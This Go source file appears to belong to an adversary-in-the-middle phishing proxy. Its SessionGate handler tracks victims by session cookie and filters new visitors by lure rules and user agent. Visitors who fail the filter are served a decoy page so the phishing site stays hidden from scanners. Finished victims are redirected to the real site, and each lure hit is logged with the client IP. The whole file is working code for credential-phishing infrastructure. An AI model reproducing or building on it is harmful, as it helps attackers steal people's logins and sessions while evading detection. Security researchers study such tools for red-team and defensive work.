package request

import (
	"fmt"
	"log/slog"
	"net/http"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/proxy"
)

type sessionManager interface {
	Get(id string) (*aitm.Session, error)
	NewSession(ctx *aitm.ProxyContext) (*aitm.Session, error)
}

// SessionGate combines session resolution with lure validation into a single
// pipeline step. For requests with an existing session cookie the session is
// loaded and all lure checks are skipped — the victim already passed validation
// on their initial lure hit. For new visitors (no cookie), lure rules are
// enforced before a session is created, so no orphaned sessions accumulate for
// spoofed requests.
type SessionGate struct {
	Sessions sessionManager
	Spoof    spoofer
	Logger   *slog.Logger
}

func (h *SessionGate) Name() string { return "SessionGate" }

func (h *SessionGate) Handle(ctx *aitm.ProxyContext, req *http.Request) error {
	// Established session — load and skip lure checks.
	if cookie, err := req.Cookie(proxy.SessionCookieName); err == nil && cookie.Value != "" {
		if sess, err := h.Sessions.Get(cookie.Value); err == nil {
			ctx.Session = sess
			ctx.IsNewSession = false

			// Session already complete — redirect to the real site immediately
			// instead of proxying further requests.
			if sess.IsDone() && ctx.Lure != nil && ctx.Lure.RedirectURL != "" {
				http.Redirect(ctx.ResponseWriter, req, ctx.Lure.RedirectURL, http.StatusFound)
				return proxy.ErrShortCircuit
			}
			return nil
		}
	}

	// New visitor — enforce lure rules before creating a session.
	if ctx.Lure == nil || ctx.Lure.IsPaused() || !ctx.Lure.MatchesUA(req.UserAgent()) {
		h.Spoof.ServeWithTarget(ctx.ResponseWriter, req, contextSpoofURL(ctx))
		return proxy.ErrShortCircuit
	}

	session, err := h.Sessions.NewSession(ctx)
	if err != nil {
		return fmt.Errorf("session_gate: %w", err)
	}

	ctx.Session = session
	ctx.IsNewSession = true

	h.Logger.Info("lure hit",
		"session_id", session.ID,
		"phishlet", session.Phishlet,
		"lure_id", session.LureID,
		"client_ip", ctx.ClientIP,
		"user_agent", req.UserAgent(),
	)

	return nil
}

var _ proxy.RequestHandler = (*SessionGate)(nil)
